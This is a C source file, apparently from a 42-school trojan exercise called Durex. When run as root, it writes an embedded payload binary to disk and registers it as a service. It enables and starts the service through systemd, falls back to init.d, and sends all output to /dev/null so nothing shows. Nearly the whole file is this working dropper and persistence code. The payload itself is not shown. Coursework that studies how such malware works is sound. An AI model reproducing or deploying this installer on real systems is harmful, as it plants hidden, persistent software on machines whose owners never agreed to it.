/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   durex.c                                            :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: eparisot <eparisot@42.student.fr>          +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2021/05/25 14:55:42 by eparisot          #+#    #+#             */
/*   Updated: 2021/05/25 14:55:42 by eparisot         ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include "../includes/durex.h"

static int create_file()
{
	// creates a Durex file
	int durex_fd;

	if ((durex_fd = open(BIN_PATH, O_WRONLY | O_CREAT | O_TRUNC, 0755)) < 0)
	{
		if (DEBUG) printf("Error %d creating 'Durex' file.\n", durex_fd);
		return (-1);
	}
	// write content
	write(durex_fd, payload_payload, payload_payload_len);
	close(durex_fd);
	return 0;
}

static int init_d()
{
	int init_fd = 0;

	if ((init_fd = open(SYSTEMD_DIR, O_WRONLY | O_CREAT | O_TRUNC, 0644)) < 0)
	{
		return -1;
	}
	// write content
	write(init_fd, service_system_d, service_system_d_len);
	close(init_fd);
	// reload systemd
	system("systemctl enable Durex.service 1>/dev/null 2>/dev/null");
	int ret = system("systemctl start Durex.service 1>/dev/null 2>/dev/null");
	// if systemd not installed, switch to init d
	if (ret)
	{
		if ((init_fd = open(INITD_DIR, O_WRONLY | O_CREAT | O_TRUNC, 0755)) < 0)
		{
			return -1;
		}
		// write content
		write(init_fd, service_init_d, service_init_d_len);
		close(init_fd);
		// reload initd
		system("update-rc.d Durex defaults 1>/dev/null 2>/dev/null");
		system("update-rc.d Durex enable 1>/dev/null 2>/dev/null");
		system("/etc/init.d/Durex start 1>/dev/null 2>/dev/null");
	}
	return 0;
}

int main(void)
{
	// check sudo
	if (getuid() == 0)
	{
		create_file();
		init_d();
		printf("eparisot\n");
	}
	else
	{
		if (DEBUG) printf("Insufficient Permissions, please re-run as root.\n");
	}
	return 0;
}